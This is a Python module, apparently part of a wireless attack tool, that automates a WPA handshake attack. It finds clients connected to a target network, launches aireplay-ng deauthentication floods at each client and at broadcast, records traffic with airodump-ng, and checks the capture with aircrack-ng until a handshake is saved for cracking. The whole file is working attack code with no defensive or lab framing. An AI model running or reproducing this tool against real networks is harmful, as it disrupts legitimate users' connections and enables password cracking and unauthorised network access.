import os
import time
import signal
import subprocess
import threading
import shutil
from datetime import datetime
from utils import colored_log, Colors


def capture_handshake(self, network) -> str | None:
    """Capture handshake from target network"""
    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface found")
        return None

    # Detect connected clients
    from scanner import detect_connected_clients

    clients = detect_connected_clients(self, network)
    if not clients:
        colored_log(
            "error",
            f"No connected clients detected for {network.essid}. Stopping process.",
        )
        return None

    # Deauthenticate clients
    deauthenticate_clients(self, network, clients)

    # Create capture filename
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
    capture_path = os.path.join(self.temp_dir, capture_name)

    colored_log("info", f"Starting handshake capture for {network.essid}...")

    # Reset flags
    self.stop_capture = False
    self.handshake_found = False

    # Start capture process
    capture_cmd = [
        "airodump-ng",
        "--bssid",
        network.bssid,
        "--channel",
        str(network.channel),
        "--write",
        capture_path,
        self.monitor_interface,
    ]

    capture_proc = subprocess.Popen(
        capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Start handshake watcher
    cap_file = f"{capture_path}-01.cap"
    watcher_thread = threading.Thread(
        target=_handshake_watcher,
        args=(
            self,
            cap_file,
        ),
    )
    watcher_thread.daemon = True
    watcher_thread.start()

    # Limit capturing to 1 minute
    timeout = 60  # 1 minute
    start_time = time.time()
    try:
        while not self.handshake_found:
            elapsed_time = int(time.time() - start_time)
            remaining_time = max(0, timeout - elapsed_time)

            if elapsed_time % 1 == 0:
                print(
                    f"{Colors.BLUE}[*] Capturing handshake... Time left: {remaining_time}s{Colors.ENDC}",
                    end="\r",
                )

            if elapsed_time >= timeout:
                colored_log("warning", "Handshake capture timed out after 1 minute.")
                break
            time.sleep(1)
    except KeyboardInterrupt:
        colored_log("warning", "Capture cancelled by user")
    finally:
        self.stop_capture = True
        capture_proc.send_signal(signal.SIGTERM)
        capture_proc.wait()

    print("\n")  # Move to next line after countdown

    if not self.handshake_found:
        colored_log("error", "Failed to capture handshake after deauthentication.")
        return None

    # Save handshake file
    final_path = os.path.join(
        self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
    )
    shutil.copy(cap_file, final_path)
    colored_log("success", f"Handshake saved to {final_path}")
    return final_path


def deauthenticate_clients(self, network, clients: list[str]):
    """Deauthenticate all connected clients using multithreading without waiting"""
    colored_log(
        "info",
        f"Starting deauthentication for {len(clients)} clients on {network.essid}...",
    )

    # 1. Function to perform individual deauth without waiting
    def deauth_client(client: str):
        deauth_cmd = [
            "aireplay-ng",
            "--deauth",
            "3",  # Reduced to 3 packets for speed
            "-a",
            network.bssid,
            "-c",
            client,
            self.monitor_interface,
        ]
        # Jalankan tanpa menunggu
        subprocess.Popen(
            deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    # Start threads without waiting
    threads = []
    for client in clients:
        colored_log("info", f"Sending deauth to client {client}...")
        thread = threading.Thread(target=deauth_client, args=(client,))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Minimal wait to ensure packets are sent
    for thread in threads:
        thread.join(timeout=0.5)  # Reduced timeout to 0.5 seconds

    # 2. Perform broadcast deauth without waiting
    broadcast_deauth_cmd = [
        "aireplay-ng",
        "--deauth",
        "3",  # Reduced to 3 packets
        "-a",
        network.bssid,
        self.monitor_interface,
    ]
    colored_log("info", "Sending broadcast deauthentication...")
    subprocess.Popen(
        broadcast_deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Log completion immediately
    colored_log(
        "success", "Deauthentication process initiated for all connected clients."
    )


def _handshake_watcher(self, cap_file: str):
    """Watch for handshake in capture file"""
    while not self.stop_capture:
        if os.path.exists(cap_file) and _check_handshake(self, cap_file):
            colored_log("success", "Handshake detected!")
            self.handshake_found = True
            self.stop_capture = True
            break
        time.sleep(1)  # Check every 1 seconds


def _check_handshake(self, cap_file: str) -> bool:
    """Check if capture file contains handshake"""
    from utils import execute_command

    if not os.path.exists(cap_file):
        return False

    # Check with aircrack-ng
    result = execute_command(["aircrack-ng", cap_file])
    return result and "1 handshake" in result.stdout
